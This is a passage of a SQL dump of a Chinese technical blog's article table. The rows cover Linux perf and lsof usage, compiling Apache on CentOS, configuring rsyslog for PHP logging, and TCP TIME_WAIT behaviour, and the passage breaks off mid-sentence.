(latencies)\r\n       script          Read perf.data (created by perf record) and display trace output\r\n       stat            运行一个命令并且收集性能计数统计信息\r\n       test            运行可用性测试\r\n       timechart       Tool to visualize total system behavior during a workload\r\n       top             系统分析工具.\r\n       trace           受strace启发创建的工具\r\n       probe           定义一个新的动态跟踪点\r\n\r\n     See ''perf help COMMAND'' for more information on a specific command.\r\n\r\n#####perf stat \r\n\r\n`perf stat`通过概括精简的方式提供被调试程序运行的整体情况和汇总数据。\r\n\r\n创建如下C程序test.c\r\n\r\n    #include <stdio.h>\r\n\r\n    int main()\r\n    {\r\n        int i = 1;\r\n        while (1) {\r\n            if (i == 100000) break;\r\n            i ++;\r\n        }\r\n        return 0;\r\n    }\r\n\r\n编译`gcc test.c -o test`。\r\n\r\n    $ perf stat ./test\r\n\r\n     Performance counter stats for ''./test'':\r\n\r\n              0.837322 task-clock                #    0.747 CPUs utilized          \r\n                     1 context-switches          #    0.001 M/sec                  \r\n                     0 CPU-migrations            #    0.000 M/sec                  \r\n                    98 page-faults               #    0.117 M/sec                  \r\n               269,259 cycles                    #    0.322 GHz                     [90.39%]\r\n               897,270 stalled-cycles-frontend   #  333.24% frontend cycles idle   \r\n               226,746 stalled-cycles-backend    #   84.21% backend  cycles idle   \r\n               764,602 instructions              #    2.84  insns per cycle        \r\n                                                 #    1.17  stalled cycles per insn\r\n               267,843 branches                  #  319.881 M/sec                  \r\n                 3,467 branch-misses             #    1.29% of all branches         [80.37%]\r\n\r\n           0.001121130 seconds time elapsed\r\n\r\n\r\n第一个`task-clock`是CPU利用率，该值比较高，说明该程序属于CPU密集型。第二个`context-switches`是进程上下文切换次数，频繁的切换次数应该是要避免的。\r\n\r\n#####perf top\r\n\r\n用于实时显示当前系统的性能统计信息。该命令主要用来观察整个系统当前的状态，比如可以通过查看该命令的输出来查看当前系统最耗时的内核函数或某个用户进程。\r\n\r\n> 执行该命令需要root权限。\r\n\r\n使用方法如下\r\n\r\n    $ sudo perf top\r\n\r\n程序会与top命令类似，动态输出以下内容\r\n\r\n    Samples: 1K of event ''cpu-clock'', Event count (approx.): 8071695\r\n     39.60%  [kernel]             [k] __do_softirq\r\n     13.46%  [kernel]             [k] _raw_spin_unlock_irqrestore\r\n      9.37%  [kernel]             [k] VbglGRPerform\r\n      8.47%  [kernel]             [k] e1000_xmit_frame\r\n      6.01%  [kernel]             [k] finish_task_switch\r\n      5.82%  [kernel]             [k] e1000_clean\r\n      5.15%  [kernel]             [k] native_read_tsc\r\n      4.75%  [kernel]             [k] kmem_cache_free\r\n      1.32%  [kernel]             [k] tick_nohz_idle_enter\r\n      1.28%  libc-2.17.so         [.] __strstr_sse2\r\n      1.22%  libc-2.17.so         [.] __memset_sse2\r\n      0.82%  libc-2.17.so         [.] __GI___strcmp_ssse3\r\n      0.42%  libpython2.7.so.1.0  [.] 0x000000000007e7c6\r\n      0.42%  libc-2.17.so         [.] __strchrnul\r\n      0.39%  [kernel]             [k] e1000_alloc_rx_buffers\r\n      0.38%  libz.so.1.2.7        [.] 0x0000000000002d76\r\n      0.24%  [kernel]             [k] tick_nohz_idle_exit\r\n      0.21%  [kernel]             [k] kfree\r\n\r\n#####perf report/record\r\n\r\n使用 top 和 stat 之后，您可能已经大致有数了。要进一步分析，便需要一些粒度更细的信息。比如说您已经断定目标程序计算量较大，也许是因为有些代码写的不够精简。那么面对长长的代码文件，究竟哪几行代码需要进一步修改呢？这便需要使用 perf record 记录单个函数级别的统计信息，并使用 perf report 来显示统计结果。\r\n\r\n创建新的C程序test3，代码如下\r\n\r\n    #include <stdio.h>\r\n\r\n    void test();\r\n\r\n    int main()\r\n    {\r\n      test();\r\n      return 0;\r\n    }\r\n\r\n    void test()\r\n    {\r\n      long i;\r\n      for (i = 0; i < 10000000; i ++) {\r\n        \r\n      }\r\n      puts("finished");\r\n    }\r\n\r\n编译后，执行如下命令\r\n    \r\n    $ perf record ./test3\r\n    $ perf report\r\n\r\n输出以下内容\r\n\r\n    Samples: 68  of event ''cpu-clock'', Event count (approx.): 17000000\r\n     97.06%  test3  test3              [.] test\r\n      1.47%  test3  [kernel.kallsyms]  [k] __do_softirq\r\n      1.47%  test3  [kernel.kallsyms]  [k] queue_work_on\r\n\r\n从中可以看到，大部分时间都消耗在了test函数中。\r\n\r\n> `perf record`命令增加`-g`参数可以记录函数的调用图信息。更多详情参考: [Perf -- Linux下的系统性能调优工具][]\r\n\r\n####lsof命令: 列出打开的文件\r\n\r\n工具`lsof`是一个可以列出操作系统打开的文件的工具，在Linux系统中，任何事物都是以文件的形式存在，通过文件不仅可以访问常规文件，还可以访问网络连接和硬件设备。\r\n\r\n在终端下直接输入`lsof`命令，会列出当前系统打开的所有文件，因为它需要列出核心内存和各种文件，所以必须使用root用户运行才能显示详细的信息。\r\n\r\n    COMMAND     PID      USER   FD      TYPE             DEVICE  SIZE/OFF       NODE NAME\r\n    init          1      root  cwd       DIR              253,0      4096          2 /\r\n    init          1      root  rtd       DIR              253,0      4096          2 /\r\n    init          1      root  txt       REG              253,0    150352      10973 /sbin/init\r\n    init          1      root  mem       REG              253,0     65928     264638 /lib64/libnss_files-2.12.so\r\n    init          1      root  mem       REG              253,0   1922112     265339 /lib64/libc-2.12.so\r\n    init          1      root  mem       REG              253,0     93224     277540 /lib64/libgcc_s-4.4.6-20120305.so.1\r\n    init          1      root  mem       REG              253,0     47064     267086 /lib64/librt-2.12.so\r\n    ...\r\n\r\n这里的***COMMAND***是进程名称，***PID,USER***分别指的是进程的ID和进程所有者，***FD***是文件描述符，***TYPE***是文件类型，***DEVICE***是磁盘名称，***SIZE***是文件大小，***NODE***是索引节点（文件在磁盘上的标识），***NAME***是打开文件的确切名称。\r\n\r\n对于***FD***的值，*cwd*表示当前工作目录，*Lnn*表示类库引用，*mem*表示内存映射文件，*rtd*表示根目录，*pd*表示父目录，*txt*表示进程的数据和代码。\r\n\r\n#####常用参数及说明\r\n\r\n- lsof **filename** 显示打开指定文件的所有进程\r\n- lsof **-a** 表示两个参数都必须满足时才显示结果\r\n- lsof **-c string** 显示COMMAND列中包含指定字符的进程所有打开的文件\r\n- lsof **-u username** 显示所属user进程打开的文件\r\n- lsof **-g gid** 显示归属gid的进程情况\r\n- lsof **+d /DIR/** 显示目录下被进程打开的文件\r\n- lsof **+D /DIR/** 同上，但是会搜索目录下的所有目录，时间相对较长\r\n- lsof **-d FD** 显示指定文件描述符的进程\r\n- lsof **-n** 不将IP转换为hostname，缺省是不加上-n参数\r\n- lsof **-i** 用以显示符合条件的进程情况\r\n- lsof **-p PID** 选择指定PID\r\n- lsof **-i[46] [protocol][@hostname|hostaddr][:service|port]**\r\n    46: IPv4 or IPv6\r\n    protocol: TCP or UDP\r\n    hostname: Internet host name\r\n    hostaddr: IPv4地址\r\n    service: /etc/service中的 service name (可以不只一个)\r\n    port: 端口号 (可以不只一个)\r\n\r\n> 参考: [百度文库][]\r\n\r\n\r\n\r\n\r\n[Perf -- Linux下的系统性能调优工具]:http://www.ibm.com/developerworks/cn/linux/l-cn-perf1/\r\n[百度文库]:http://baike.baidu.com/link?url=VXbFBeisjSpMDZzkUQlNiDZrCAi6p7q1TJcgbCT4J4k4mxcU2fyoYOj1Vz8KCBBAKeTJ5qNeeqTnGYhMAh-zfK\r\n', '本文是Linux实用命令集锦的第二部分，收集了常用的Linux命令，根据本人是学习的进度，不断更新。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/68dd5b2d9a280c19042ba933d34be2f1.jpg', 'mylxsw', '原创', 1, 0, 1422766558, NULL, NULL, 'markdown'),
(416, 'Cent OS下编译安装 Apache/ab 工具', '本文讲述了在 CentOS 服务器下编译安装 Apache 服务器的步骤以及遇到的问题解决办法。\r\n\r\n首先到官网下载 apache httpd 服务器的源码，解压后执行`./configure`进行配置。\r\n\r\n    cd ~\r\n    wget http://mirror.bit.edu.cn/apache//httpd/httpd-2.4.12.tar.bz2\r\n    tar jxvf httpd-2.4.12.tar.bz2\r\n    cd httpd-2.4.12\r\n    ./configure --prefix=/usr/local/apache\r\n\r\n提示缺少 APR ，需要提供 Apr才能继续，下载 Apr 加入到源码目录的srclib 目录。\r\n\r\n    cd ~\r\n    wget http://apache.fayea.com/apr/apr-1.5.1.tar.gz\r\n    tar -zxvf apr-1.5.1.tar.gz\r\n    mv apr-1.5.1 httpd-2.4.12/srclib/apr\r\n    wget http://apache.fayea.com//apr/apr-util-1.5.4.tar.gz\r\n    tar -zxvf apr-util-1.5.4.tar.gz\r\n    mv apr-util-1.5.4 httpd-2.4.12/srclib/apr-util\r\n\r\n接下来重新编译\r\n\r\n    cd ~/httpd-2.4.12\r\n    ./configure --prefix=/usr/local/apache --with-included-apr\r\n    make\r\n    sudo make install\r\n\r\n> 注意，这里需要新增`--with-included-apr`选项。我们提供了`--prefix`选项指定了安装位置为`/usr/local/apache`。\r\n\r\n\r\n最后，apache 已经安装在 `/usr/local/apache`目录了。在`/usr/local/apche/bin`目录中可以找到`ab` 命令。\r\n', '本文讲述了在 CentOS 服务器下编译安装 Apache 服务器的步骤以及遇到的问题解决办法。\r\n', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/f6a32fdd9e8f35e29fe6937179228208.jpg', 'mylxsw', '原创', 1, 0, 1425604737, NULL, NULL, 'markdown');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(417, 'Php在linux环境下使用rsyslog管理日志', '在 Linux 系统中，日志文件记录了系统中包括内核、服务和其它应用程序等在内的运行信息。\r\n在我们解决问题的时候，日志是非常有用的，它可以帮助我们快速的定位遇到的问题。\r\n\r\n在 Cent OS 6中，日志是使用`rsyslogd`守护进程进行管理的，该进程是之前版本的系统中`syslogd`的升级版，对原有的日志系统进行了功能的扩展，提供了诸如过滤器，日志加密保护，各种配置选项，输入输出模块，支持通过 TCP 或者 UDP 协议进行传输等。\r\n\r\n`rsyslog`的配置文件为 **/etc/rsyslog.conf** , 大多数日志文件都位于 **/var/log/** 目录中。\r\n\r\n###定位日志文件\r\n\r\n大多数日志文件都位于 **/var/log/** 目录中。在该目录中，你可能注意到很多日志文件末尾包含一串数字（如 *maillog-20150301* ），这说明这些日志文件经过了日志转储，这样可以避免日志文件过大。\r\n\r\n> 在软件包`logrotate`中包含了一个定时任务，根据`/etc/logrotate.conf`文件和`/etc/logrotate.d/`目录中的的配置定期的转储日志文件。\r\n\r\n###Rsyslog基本配置\r\n\r\nRsyslog 的主要配置文件为 **/etc/rsyslog.conf** 文件，在配置文件中，我们通过配置 filter 以及 action 对日志进行管理。\r\n\r\n在`rsyslog`配置文件中，使用如下格式定义规则\r\n\r\n	filter		action\r\n\r\n`rsyslog`发现符合 filter 规则的日志后，会将日志发送到 action 指定的动作进行处理。\r\n\r\n####Filter\r\n\r\n在`rsyslog`中，提供了三种方式的过滤器方法：\r\n\r\n##### 基于设施/优先级的过滤器 *(Facility/Priority-based filters)*\r\n\r\n基于设施/优先级的过滤器是最常用的方法，语法如下：\r\n\r\n	FACILITY.PRIORITY\r\n\r\n`FACILITY`指定了产生日志消息的子系统，可选值为 **auth** , **authpriv** , **cron** , **daemon** , **kern** , **lpr** , **mail** , **news** , **syslog** , **user** , **ftp** , **uucp** , **local0** ~ **local7** 。\r\n\r\n`PRIORITY`指定了日志消息的优先级，可用的优先级包含 **debug (7)** , **info (6)** , **notice (5)** , **warning (4)** , **err (3)** , **crit (2)** , **alert (1)** , **emerg (0)** 。\r\n\r\n> 前置符号`=`表明只有该优先级的消息会被捕获，`!`表明除了该优先级的消息之外的优先级会被捕获。除了前置符号外，可以使用符号`*`\r\n表示所有的设施或者优先级，对优先级部分使用`none`关键字会捕获所有没有指定优先级的消息。\r\n\r\n定义多个设施或者优先级使用`,`分隔，如果是多个 filter 的话，则使用`;`进行分隔。\r\n\r\n使用范例\r\n\r\n	kern.*					# 选择所有优先级的内核日志\r\n    mail.crit				 # 选择所有mail 的优先级高于crit的日志\r\n	cron.!info,!debug		 # 选择除了 info 和 debug 优先级的 cron 日志\r\n\r\n\r\n##### 基于属性的过滤器\r\n\r\n基于属性的过滤器语法\r\n\r\n	:PROPERTY, [!]COMPARE_OPERATION, "STRING"\r\n\r\n`:PROPERTY`是要比较的日志属性，`COMPARE_OPERATION` 为要执行的比较操作，这个的`!`表示取反的意思，`"STRING"`为比较的值。\r\n\r\n可以使用的比较操作：\r\n\r\n| 比较操作        | 描述\r\n|----------------|-------------------------------------\r\n| contains       | 匹配提供的字符串值是否是属性的一部分，如果不区分大小写，使用`contains_i`\r\n| isequal        | 比较属性和值是否相等\r\n| startswith     | 属性是否以指定字符串开始(`startswith_i`)\r\n| regex          | 正则表达式(POSIX BRE 基本正则)匹配\r\n| ereregex       | 正则表达式(POSIX ERE 扩展正则)匹配\r\n| isempty        | 判断属性是否为空，不需要 value\r\n\r\n使用范例：\r\n\r\n	:msg, contains, "error"\r\n    :hostname, isequal, "host1"\r\n	:msg, !regex, "fatal .* error"\r\n\r\n\r\n##### 基于表达式的过滤器\r\n\r\n基于表达式的过滤器使用了`rsyslog`自定义的脚本语言[RainerScript][RainerScript]构建复杂的filter，这里暂时不对这种方法进行讲述。\r\n\r\n####Action\r\n\r\nAction定义了当匹配指定的 filter 的时候，执行什么操作。\r\n\r\n> 如果要指定多个 ACTION， 使用 `&`连接多个 ACTION。\r\n> 例如：\r\n>\r\n>		kern.=crit user1\r\n>    	& ^test-program;temp\r\n>    	& @192.168.0.1\r\n>\r\n> 这里的`;temp`指定了传递日志给 test-program 程序时（ **^** 开头表明日志发送给该可执行文件），使用它 temp 模板格式化日志。\r\n\r\n在 ACTION 后面追加`;模板名称`可以为指定的 action 使用该模板格式化日志。\r\n\r\n#####保存日志到日志文件\r\n\r\n语法：\r\n\r\n	FILTER PATH\r\n\r\n这里的 **PATH** 指定了日志要保存到的文件。例如 `cron.* /var/log/cron.log` 指定了所有的定时任务日志都写入到`/var/log/cron.log`文件。\r\n\r\n> 默认情况下，每次生成 syslog 的时候，日志信息会同步到日志文件。可以在文件路径前使用 **-** 指定忽略同步（如果系统崩溃，会丢失日志，但是这样可以提高日志性能）。\r\n\r\n除了上述方法记录日志（静态），也可以动态的生成日志文件。\r\n\r\n	FILTER     ?DynamicFile\r\n\r\n这里的`DynamicFile`是预定义的输出路径模板。\r\n\r\n#####通过网络发送syslog\r\n\r\n`rsyslog`可以使用网络将日志消息发送或者接受日志，使用这个特性，可以实现使用单一的日志服务器统一管理多台服务器日志。\r\n\r\n	@[(zNUMBER)]HOST:[PORT]\r\n\r\n这里的`@`告诉`syslog`使用 *UDP* 协议发送日志，要使用 *TCP* 的话，使用 `@@`。可选值`zNUMBER`设置了是否允许使用`zlib`对日志压缩（压缩级别1-9）。\r\n\r\n使用范例\r\n\r\n	*.* @192.168.0.1		# 使用 UDP 发送，默认端口514\r\n    *.* @@example.com:18	# 使用 TCP 发送到端口18， 默认10514\r\n	*.* @(z9)[2001:db8::1]  # UDP, ipv6，使用zlib级别9压缩\r\n\r\n#####丢弃日志\r\n\r\n要丢弃日志消息，使用`~`动作。\r\n\r\n	FILTER    ~\r\n\r\n例如：\r\n\r\n    cron.* ~\r\n\r\n####模板\r\n\r\n任何`rsyslog`生成的日志都可以根据需要使用模板进行格式化，要创建模板，使用如下指令\r\n\r\n	$template TEMPLATE_NAME,"text %PROPERTY% more text", [OPTION]\r\n\r\n这里的`$template`指令表明了接下来的内容定义了一个模板，`TEMPLATE_NAME`是模板的名称，接下来双引号之间的内容为模板的内容。\r\n\r\n> 这里还有一个 OPTION ， 它指定了模板的功能，支持选项为`sql`和`stdsql`，在使用数据库存储的时候会用到。\r\n\r\n#####生成动态文件名\r\n\r\n模板可以用来生成动态文件名，就如之前所述，在使用动态文件名的时候，需要在 ACTION 中的模板名称前增加`?`表明该文件名是动态生成的。\r\n\r\n例如:\r\n\r\n	$template DynamicFile,"/var/log/test_logs/%timegenerated%-test.log"\r\n	*.* ?DynamicFile\r\n\r\n> `timegenerated`属性从日志信息中提取出消息的时间戳，这样可以为每个日志生成唯一文件名称。\r\n\r\n#####属性\r\n\r\n在模板中使用的属性是在`%`之间的内容，使用属性可以访问日志消息中的内容。\r\n\r\n	%PROPERTY_NAME[:FROM_CHAR:TO_CHAR:OPTION]%\r\n\r\n可用的属性列表见`man rsyslog.conf`。\r\n\r\n####全局指令\r\n\r\n全局指令是`rsyslogd`守护进程的配置指令。所有的全局指令必须以`$`开始，每行只能有一个指令，例如：\r\n\r\n	$MainMsgQueueSize 50000\r\n\r\n> 在新的配置格式中(rsyslog v6)，已经不在使用这种方式的指令，但是它们仍然是可用的。\r\n\r\n###队列\r\n\r\n在 rsyslog 中，队列用来传输数据，当 rsyslog 接收到一个消息的时候，首先传递消息预处理器，然后加入到主消息队列，接下来消息会从队列中取出传递给规则处理器。\r\n\r\n![Message Flow in Rsyslog][rsyslog_message_flow]\r\n\r\n规则处理器是一个解析过滤引擎，它会基于配置文件中定义的规则，执行相应的动作(action)，每一个动作都有自己的动作队列，消息通过这个队列发送到对应的动作处理器，然后输出。\r\n\r\n> 对于同一个消息来说，可以同时传递这个消息给多个动作队列。\r\n\r\n####定义队列\r\n\r\n在配置文件`/etc/rsyslog.conf`文件中\r\n\r\n	$objectQueueType queue_type\r\n\r\n这里的队列类型可选值为 **direct** , **linkedlist** , **fixedarray** (内存队列), 或者 **disk** 。\r\n\r\n默认情况下，对于主队列，使用的是FixedArray队列（10000个消息长度），动作队列采用的是direct 队列。\r\n\r\n\r\n###PHP 使用 syslog 输出日志\r\n\r\n在PHP 中，调用系统日志系统的函数有三个\r\n\r\n	bool openlog ( string $ident , int $option , int $facility )\r\n	bool syslog ( int $priority , string $message )\r\n	bool closelog ( void )\r\n\r\n函数`openlog`用于打开到系统日志系统的连接，第一个参数`$ident`是一个字符串，syslog 会将该字符串自动加到使用`syslog`函数输出的所有日志消息的前面。第二个参数是日志选项，第三个参数是记录日志的设施。\r\n\r\n> 函数`openlog()`和`closelog()`是可选的。\r\n\r\n例如，我们在`/etc/rsyslog.conf`配置文件中增加如下配置\r\n\r\n	local5.*     /tmp/php_test.log\r\n\r\n增加后需要重启 rsyslog 进程(`sudo /etc/init.d/rsyslog restart`)\r\n\r\n在 PHP 脚本中，执行如下操作\r\n\r\n    <?php\r\n    openlog("LogHeader", LOG_PID, LOG_LOCAL5);\r\n    syslog(LOG_DEBUG, "Hello, Logger");\r\n\r\n执行上述脚本，我们可以在`/tmp`目录中看到出现名为`php_test.log`的文件\r\n\r\n	Mar 10 14:47:04 vm-hp LogHeader[8261]: Hello, Logger\r\n\r\n第一部分`Mar 10 14:47:04`为日志时间，第二部分`vm-hp`为主机的 HOSTNAME , 我们在 调用`openlog`函数的时候，指定了 `indent`为`LogHeader`， 同时在日志中加入进程的 PID（LOG_PID）。\r\n\r\n上述日志消息，如果要使用模板的话，是下面这样的\r\n\r\n	$template LOG_TMP,"%timegenerated% %HOSTNAME% %msg%"\r\n    local5.*     /tmp/php_test.log;LOG_TMP\r\n\r\n我们将所有支持的模板属性变量输出如下\r\n\r\n    msg:  Hello, Logger,\r\n    rawmsg: <175>Mar 10 15:52:49 LogHeader[13845]: Hello, Logger, \r\n    HOSTNAME: vm-28-234-pro01-hp, \r\n    FROMHOST: vm-28-234-pro01-hp, \r\n    syslogtag: LogHeader[13845]:, \r\n    programname: LogHeader, \r\n    PRI: 175, \r\n    PRI-text: local5.debug, \r\n    IUT: 1, \r\n    syslogfacility: 21, \r\n    syslogfacility-text: local5, \r\n    syslogseverity: 7, \r\n    syslogseverity-text: debug, \r\n    timereported: Mar 10 15:52:49, \r\n    TIMESTAMP: Mar 10 15:52:49,\r\n    timegenerated: Mar 10 15:52:49,\r\n    PROTOCOL-VERSION: 0, \r\n    STRUCTURED-DATA: -, \r\n    APP-NAME: LogHeader, \r\n    PROCID: 13845, \r\n    MSGID: -\r\n\r\n\r\n---\r\n\r\n参考: [Red Hat Enterprise linux 6 Deployment Guide: Chapter 23. Viewing and Managing Log Files](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Deployment_Guide/ch-Viewing_and_Managing_Log_Files.html)\r\n\r\n\r\n\r\n[RainerScript]:http://www.rsyslog.com/doc/rainerscript.html\r\n[rsyslog_message_flow]:http://aicode.cn/assets/images/rsyslog_message_flow.png', '在 Linux 系统中，日志文件记录了系统中包括内核、服务和其它应用程序等在内的运行信息。 在我们解决问题的时候，日志是非常有用的，它可以帮助我们快速的定位遇到的问题。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/71da92c2370f4330f1ab5efe44e912a4.jpg', 'mylxsw', '原创', 1, 0, 1425977143, 1425977165, 0, 'markdown'),
(418, 'TIME_WAIT详解', '在构建基于 TCP 协议的 C/S 系统的时候，经常会因为一些简单的错误而导致严重的影响系统的可扩展性。 其中一些错误是因为对`TIME_WAIT`状态不理解导致的。 在本文中，我将会讲解为什么要存在`TIME_WAIT` 状态，它的存在所造成的一些问题以及如何解决这些问题。\r\n\r\n`TIME_WAIT`在 TCP 的状态流程图中是一个很容易被误解的状态。它是表示socket可以进入和留存相当长一段时间的状态，如果你的系统中有很多 socket 处于`TIME_WAIT`状态，那么当你需要创建新的 socket 连接的时候可能会受到影响，这也会影响到你的程序的扩展性。很多人对于如何以及为何 socket 关闭连接的时候要在第一个地方以`TIME_WAIT`状态结束感到困惑，这里没有什么神秘的，从下面的 TCP 状态流程图中可以看出，`TIME_WAIT`状态是TCP 客户端断开连接之后的最终状态。\r\n\r\n![TCP-StateTransitionDiagram-NormalTransitions][]\r\n\r\n尽管状态图显示的 `TIME_WAIT` 是客户端结束连接的最终状态，但这并不是说一定是客户端的结束状态才是`TIME_WAIT`，实际上，这是主动关闭连接(active close)的设备（不管是服务端还是客户端）的最终状态。什么是主动关闭连接呢？\r\n\r\n如果一个 TCP 的终端(peer)首先对这个连接调用 Close() 关闭连接，就说这个终端发起了主动关闭。在很多协议和 C/S 系统中，这是指的客户端。在 HTTP 和 FTP 服务器上，通常指的是服务端。实际的终端以 `TIME_WAIT`状态终止的事件序列图如下所示。\r\n\r\n![TCP-StateTransitionDiagram-ClosureTransitions][]\r\n\r\n现在我们已经知道socket如何以`TIME_WAIT`状态结束连接，接下来理解为什么要存在这个状态以及为什么它可能造成一些潜在的问题是非常有用的。\r\n\r\n`TIME_WAIT`通常也称为`2MSL`等待状态。这是因为切换到`TIME_WAIT`状态的socket会保持2倍的最大段生命周期(MSL)的延迟时间。MSL是TCP协议数据报中，任意一段数据在网络上被丢弃之前保持可用的最大时间。这个时间使用用于传输TCP段的IP数据报中的TTL字段进行设置，不同的实现为`MSL`设置了不同的值，通常为 **30s**，**一分钟** 或者 **两分钟** 。[RFC793][] 指出`MSL`为 **2分钟** ，在Windows下默认为该值，当然，可以通过修改注册表项[TcpTimedWaitDelay][]设置该值。\r\n\r\n之所以`TIME_WAIT`能够影响系统的扩展性是因为在一个TCP连接中，一个Socket如果关闭的话，它将保持`TIME_WAIT`状态大约 **4分钟** 。如果很多连接快速的打开和关闭的话，系统中处于`TIME_WAIT`状态的socket将会积累很多，你可以使用`netstat`命令查看处于`TIME_WAIT`状态的socket。由于本地端口数量的限制，同一时间只有有限数量的socket连接可以建立，如果太多的socket处于`TIME_WAIT`状态，你会发现，由于用于新建连接的本地端口太缺乏，将会很难再建立新的对外连接。 但是为什么要有`TIME_WAIT`状态呢？\r\n\r\n对于`TIME_WAIT`的存在，有两个理由。一个原因是为了防止一个连接中延迟的数据段会被后序的连接错误的解析。当一个连接处于`2MSL`状态的时候，任何到达的数据段都将会被丢弃。\r\n\r\n![TIME_WAIT-why][]\r\n\r\n在上图中，我们有从终端1到终端2的两个连接。在每个连接中，每个终端的地址和端口是相同的。第一个主动关闭的连接是由终端2主动发起的。如果终端2没有保持在`TIME_WAIT`状态足够长的时间以确保先前的连接中所有的数据段（每个数据段都有自己相应的序列号）都已经不可用了的话，可能会错误的成为第二个连接的一部分。\r\n\r\n注意的是，延迟的数据段一般不会像这里这样造成问题。首先，每个终端的地址和端口号必须是相同的，这一点是可能性很小的，因为客户端的端口号通常由操作系统自动从可用端口范围中任意选择端口，并且在不同的连接中该端口通常是不同的。其次，延迟的片段的序列号需要在第二个连接中是可用的，这也是不太可能的。但是如果一旦这两个条件同时发生，`TIME_WAIT`状态可以防止新链接的数据出现问题。\r\n\r\n第二个原因是为了实现TCP全双工连接的终止可靠性。如果来自终端2的最后一个ACK被丢弃，那么终端1将会重新发送最后的FIN，如果这时候终端2的连接状态已经转变到了`CLOSED`，那么唯一的响应将会是发送一个RST告诉它重发FIN是不被期望的，这样的结果会导致尽管所有的数据都已经正确的传输，但是终端1还是会接收到一个错误消息。\r\n\r\n不幸的是有些操作系统对`TIME_WAIT`的实现太过简单(slightly natvie)。只有在一个连接中完全匹配的socket（一个连接使用客户端地址，端口，服务端地址，端口进行标识）才需要被`TIME_WAIT`保护，以减少`TIME_WAIT`造成的开销。然而，某些操作系统采用了更加严格的限制，并且防止重用处于`TIME_WAIT`状态的连接所包含的本地端口号。如果有太多的socket结束后处于`TIME_WAIT`状态的话，由于没有足够的新的本地端口分配给程序，因此无法建立新的对外的连接。\r\n\r\nWindows下并不是这样做的，它只防止完全匹配的处于`TIME_WAIT`状态的出站连接的建立。\r\n\r\n入站连接很少会被`TIME_WAIT`影响。虽然与客户端一样，服务器端主动关闭的连接会进入`TIME_WAIT`状态，但是服务端监听的端口并不会防止新建的入站连接请求的建立。在Windows下，服务器正在监听的知名端口可以作为后续接受的连接的一部分，如果要从一个远端地址和端口与当前正在处于`TIME_WAIT`状态的本地地址和端口建立新的连接，那么只要新的连接的序号大于当前处于`TIME_WAIT`状态的连接的最后的序号，连接就可以建立。但是，累积在服务端的处于`TIME_WAIT`状态的连接可能会影响性能和资源的使用，因为处于`TIME_WAIT`状态的连接最终都会超时，这就需要服务器对超时进行处理，并且在`TIME_WAIT`状态结束之前都会占用服务器的资源（少量）。\r\n\r\n由于本地端口的缺乏，`TIME_WAIT`的存在影响的是出站连接的建立，这些本地端口由操作系统进行自动的分配，因此，优化的方法是增加本地端口的范围，在Windows下，你可以调整 [MaxUserPort][] 注册表项。注意的是，很多Windows系统下默认的端口范围比较小，大约4000个左右，这对很多客户端服务器系统来说太少了。\r\n\r\n虽然可以减少socket在`TIME_WAIT`状态花费的时间，但通常情况下这都是不会起到什么实际的帮助的。`TIME_WAIT`只会在服务器建立了很多连接并且主动关闭的情况下会产生影响，调整`2MSL`的时间只会让服务器可以建立更多的连接并且在给定的时间内关闭，所以你必须继续调整`2MSL`的时间更低以至于该值太小，导致遇到一些由于延迟片段成为后序连接的一部分而产生的问题，当然，这只会在连接到同一个远端地址和端口号并且非常频繁的使用本地端口，或者是你连接到同样的远程地址和端口，并且绑定了固定的本地端口的时候出现。\r\n\r\n修改`2MSL`的值通常是机器全局的配置修改。你可以在socket级别使用`SO_REUSEADDR` socket选项解决`TIME_WAIT`的问题，这使得即使一个有着同样地址和端口的socket存在，也可以创建一个新的socket，新的socket最终将会劫持旧的socket。你可以使用`SO_REUSEADDR`选项，在一个有着同样端口的socket已经处于`TIME_WAIT`状态的时候创建新的socket，但这样做可能会造成一些问题，比如拒绝服务攻击或者数据窃取。在Windows平台下，有另一个socket选项`SO_EXCLUSIVEADDRUSE`，使用它可以避免`SO_REUSEADDR`选项的[缺陷][SO_EXCLUSIVEADDRUSE]，但是依我之见，最好还是避免处理`TIME_WAIT`的问题，代之好好设计你的系统，让`TIME_WAIT`不再成为问题。\r\n\r\n前面的TCP状态转换图都显示了连接断开的顺序，这里还有另外一种方式断开TCP连接。通过终止(abort)连接并发送一个`RST`代替`FIN`，这可以通过设置socket的`SO_LINGER`选项为 **0** 来实现。这样会使未处理的数据直接被丢弃并且连接被RST中断，而不是使用FIN的时候那样，未处理的数据继续完成传输。认识到当连接被RST中断的时候，任何在终端之间未处理的数据都将会被直接丢弃是非常重要的，通常这个RST代表了一个错误消息"`connection has been reset by the peer`"。远程终端知道连接是被中断还是进入了`TIME_WAIT`状态。\r\n\r\n当然，一个已经使用RST终止的连接可能成为`TIME_WAIT`所预防的延迟段问题的受害者，但是这种可能性是非常小的，原因见上述的详细描述。要防止一个中断的连接受到延迟段问题的影响，两个终端必须转换到`TIME_WAIT`状态，因为连接的关闭可能会是由传输中介造成，比如路由器。然而，在没有发生这种情况时两端都会被简单的关闭。\r\n\r\n要避免`TIME_WAIT`成为你的问题也是有办法的，这里假设你有能力修改你的客户端和服务端之间使用的协议，但是，通常情况下需要自己进行服务器设计。\r\n\r\n对于从来都不会自身建立出站连接的服务器来说，除了会牺牲部分资源和性能去维护处于`TIME_WAIT`状态的连接外，你不需要过度的担心其它的问题。\r\n\r\n对于需要同时建立出站连接和入站连接的服务器来说，黄金规则是如果需要`TIME_WAIT`的话，让远端来主动关闭连接而不是本服务器。最好的方式是无论什么原因，永远不要由服务器来初始一个主动关闭。如果你的终端超时了，使用RST中断连接代替关闭它。如果你的终端发送了不可用的数据，中断连接等。这种方法的思想是如果你的服务器永远都不初始发起主动关闭，那当前服务器就不会累积处于`TIME_WAIT`状态的socket，因此就不会造成扩展性的问题。虽然在出错的情况下中断连接是非常简单的，但是如果是正常连接的终止该如何做呢？李向情况下，你应该在你的服务器协议设计的时候有一种方法能够告诉客户端让客户端主动断开连接，而不是由服务器发起。所以，如果服务器需要中断一个连接的话，服务器发送一个应用级别的消息"we''re 